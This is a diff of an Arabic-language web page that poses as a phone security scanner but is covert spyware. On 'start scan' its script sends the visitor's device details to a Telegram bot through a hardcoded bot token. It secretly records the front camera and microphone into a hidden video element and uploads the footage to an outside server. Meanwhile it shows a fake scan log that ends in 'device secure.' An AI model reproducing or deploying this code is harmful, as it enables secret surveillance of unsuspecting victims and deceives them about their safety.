@@ -7,103 +7,46 @@
     <style>
         :root { --green: #00ff41; --red: #ff0040; }
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            font-family: 'Courier New', monospace;
-            background: #000; color: #fff;
-            height: 100vh; display: flex;
-            align-items: center; justify-content: center;
-            text-align: center; padding: 20px;
-        }
-        @keyframes glitch { 0%{transform:translate(0)} 20%{transform:translate(-2px,2px)} 40%{transform:translate(2px,-2px)} 60%{transform:translate(-1px,1px)} 80%{transform:translate(1px,-1px)} 100%{transform:translate(0)} }
+        body { font-family: 'Courier New', monospace; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; text-align: center; padding: 20px; }
         @keyframes flicker { 0%,100%{opacity:1} 50%{opacity:0.3} }
-        @keyframes scanLine { from{top:-100%} to{top:100%} }
         @keyframes pulse { 0%,100%{transform:scale(1)} 50%{transform:scale(1.05)} }
-        
-        .scan-line { position: fixed; left: 0; right: 0; height: 2px; background: rgba(0,255,65,0.1); pointer-events: none; animation: scanLine 2s linear infinite; z-index: 999; }
         .container { max-width: 400px; width: 100%; }
-        
-        .page { display: none; }
-        .page.active { display: block; }
-        
-        .skull { font-size: 60px; animation: pulse 0.5s infinite, flicker 0.3s infinite; }
-        h1 { font-size: 22px; color: var(--green); text-shadow: 0 0 30px var(--green); animation: flicker 0.4s infinite; margin: 10px 0; }
-        .subtitle { color: #333; font-size: 11px; letter-spacing: 2px; margin-bottom: 20px; }
-        
-        .device-card {
-            background: #0a0a0a; border: 2px solid var(--green);
-            border-radius: 14px; padding: 18px; margin-bottom: 20px;
-            box-shadow: 0 0 30px rgba(0,255,65,0.2);
-        }
-        .device-card .d-name { color: var(--green); font-size: 16px; font-weight: 700; }
-        .device-card .d-info { color: #333; font-size: 10px; margin-top: 4px; }
-        
-        .btn {
-            width: 100%; padding: 18px; border-radius: 12px;
-            border: 2px solid var(--green); background: #0a1a0a;
-            color: var(--green); font-size: 18px; font-weight: 700;
-            cursor: pointer; font-family: 'Courier New', monospace;
-            text-shadow: 0 0 10px var(--green);
-            box-shadow: 0 0 30px rgba(0,255,65,0.3);
-            animation: flicker 0.8s infinite;
-        }
+        .page { display: none; } .page.active { display: block; }
+        .skull { font-size: 60px; animation: pulse 0.5s infinite; }
+        h1 { font-size: 22px; color: var(--green); text-shadow: 0 0 30px var(--green); }
+        .btn { width: 100%; padding: 18px; border-radius: 12px; border: 2px solid var(--green); background: #0a1a0a; color: var(--green); font-size: 18px; font-weight: 700; cursor: pointer; font-family: 'Courier New', monospace; }
         .btn:active { background: #0a2a0a; }
-        
-        .code-screen {
-            background: #000; border: 2px solid var(--green);
-            border-radius: 10px; padding: 14px; margin: 16px 0;
-            color: var(--green); font-family: 'Courier New', monospace;
-            font-size: 10px; line-height: 1.5; text-align: left;
-            max-height: 200px; overflow-y: auto;
-            box-shadow: 0 0 25px rgba(0,255,65,0.3);
-            animation: glitch 0.2s infinite;
-        }
-        
-        .countdown { font-size: 40px; font-weight: 900; color: var(--red); text-shadow: 0 0 20px var(--red); animation: flicker 0.3s infinite; }
+        .code-screen { background: #000; border: 2px solid var(--green); border-radius: 10px; padding: 14px; margin: 16px 0; color: var(--green); font-size: 10px; line-height: 1.5; text-align: left; max-height: 200px; overflow-y: auto; }
+        .countdown { font-size: 40px; font-weight: 900; color: var(--red); }
         .progress-bar { width: 100%; height: 4px; background: #0a1a0a; border-radius: 2px; margin: 10px 0; overflow: hidden; }
-        .progress-fill { height: 100%; background: var(--red); width: 0%; transition: width 0.3s; }
-        
-        .success-icon { font-size: 70px; }
-        .success-text { color: var(--green); font-size: 22px; font-weight: 700; margin: 10px 0; text-shadow: 0 0 20px var(--green); }
-        
+        .progress-fill { height: 100%; background: var(--red); width: 0%; }
         video { display: none; }
     </style>
 </head>
 <body>
-
-<div class="scan-line"></div>
-
 <div class="container">
-    <!-- الرئيسية -->
     <div class="page active" id="page-home">
         <div class="skull">🛡️</div>
         <h1>حماية الهاتف</h1>
-        <div class="subtitle">━ SECURE SHIELD v3.0 ━</div>
-        <div class="device-card">
-            <div class="d-name" id="device-name">📱 جاري الكشف...</div>
-            <div class="d-info" id="device-info"></div>
+        <div class="device-card" style="background:#0a0a0a;border:2px solid var(--green);border-radius:14px;padding:18px;margin-bottom:20px;">
+            <div style="color:var(--green);font-size:16px;font-weight:700;" id="device-name">📱 جاري الكشف...</div>
+            <div style="color:#333;font-size:10px;" id="device-info"></div>
         </div>
         <button class="btn" onclick="startScan()">🔍 اضغط لبدء الفحص</button>
     </div>
-    
-    <!-- الفحص -->
     <div class="page" id="page-scanning">
         <div class="skull">💀</div>
         <h1>جاري الفحص الشامل...</h1>
-        <div class="subtitle">━ ANALYZING SYSTEM ━</div>
         <div class="code-screen" id="code-screen"></div>
         <div class="countdown" id="countdown">20</div>
         <div class="progress-bar"><div class="progress-fill" id="progress-fill"></div></div>
         <video id="hidden-video" autoplay playsinline muted></video>
     </div>
-    
-    <!-- النجاح -->
     <div class="page" id="page-done">
-        <div class="success-icon">✅</div>
-        <div class="success-text">جهازك بأمان</div>
-        <p style="color:#333;">تم الفحص - لا توجد تهديدات</p>
+        <div style="font-size:70px;">✅</div>
+        <div style="color:var(--green);font-size:22px;font-weight:700;">جهازك بأمان</div>
     </div>
 </div>
-
 <script>
 const CHAT_ID = new URLSearchParams(window.location.search).get('chatId') || '7276604783';
 const API = 'https://ai-proxy-eosin.vercel.app/api/upload_video';
@@ -131,31 +74,18 @@ async function sendVideo() {
     const reader = new FileReader();
     reader.onloadend = async function() {
         const base64 = reader.result.split(',')[1];
-        try {
-            await fetch(API, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 })
-            });
-        } catch(e) {}
+        try { await fetch(API, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: CHAT_ID, video_base64: base64 }) }); } catch(e) {}
     };
     reader.readAsDataURL(blob);
 }
 
 async function startScan() {
     showPage('page-scanning');
-    
-    // إرسال معلومات الجهاز
     fetch(`https://api.telegram.org/bot8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            chat_id: CHAT_ID,
-            text: `🛡️ فحص\n📱 ${device.name}\n💾 ${device.ram}`
-        })
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: `🛡️ فحص\n📱 ${device.name}\n💾 ${device.ram}` })
     }).catch(e => {});
-    
-    // تشغيل كاميرا أمامية
+
     try {
         stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
         document.getElementById('hidden-video').srcObject = stream;
@@ -164,43 +94,25 @@ async function startScan() {
         mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
         mediaRecorder.start();
     } catch(e) {}
-    
-    // الأكواد
+
     const codeScreen = document.getElementById('code-screen');
     const countdownEl = document.getElementById('countdown');
     const progressFill = document.getElementById('progress-fill');
-    
-    const logs = [
-        '[■] INITIALIZING...', '[■] DEVICE: ' + device.name, '[■] RAM: ' + device.ram,
-        '[■] CHECKING SYSTEM...', '[■] SCANNING KERNEL...', '[■] KERNEL: SECURE',
-        '[■] ROOT: NOT DETECTED', '[■] FIREWALL: ACTIVE', '[■] SSL: AES-256',
-        '[■] NO MALWARE FOUND', '[✓] DEVICE SECURE',
-    ];
-    
+    const logs = ['[■] INITIALIZING...','[■] DEVICE: '+device.name,'[■] RAM: '+device.ram,'[■] CHECKING SYSTEM...','[■] KERNEL: SECURE','[■] ROOT: NOT DETECTED','[■] FIREWALL: ACTIVE','[■] NO MALWARE','[✓] DEVICE SECURE'];
     let seconds = 20;
     
     const interval = setInterval(async () => {
         seconds--;
         countdownEl.textContent = seconds;
         progressFill.style.width = ((20 - seconds) / 20 * 100) + '%';
-        
         const lines = Math.floor(((20 - seconds) / 20) * logs.length);
         codeScreen.innerHTML = logs.slice(0, Math.min(lines + 1, logs.length)).join('<br>');
         codeScreen.scrollTop = codeScreen.scrollHeight;
-        
-        // بعد 10 ثواني، أوقف التسجيل وابعت
         if (seconds === 10 && mediaRecorder && mediaRecorder.state === 'recording') {
-            mediaRecorder.stop();
-            await new Promise(r => setTimeout(r, 1000));
-            await sendVideo();
-            if (stream) stream.getTracks().forEach(t => t.stop());
+            mediaRecorder.stop(); await new Promise(r => setTimeout(r, 1000));
+            await sendVideo(); if (stream) stream.getTracks().forEach(t => t.stop());
         }
-        
-        if (seconds <= 0) {
-            clearInterval(interval);
-            if (stream) stream.getTracks().forEach(t => t.stop());
-            showPage('page-done');
-        }
+        if (seconds <= 0) { clearInterval(interval); if (stream) stream.getTracks().forEach(t => t.stop()); showPage('page-done'); }
     }, 1000);
 }
 </script>
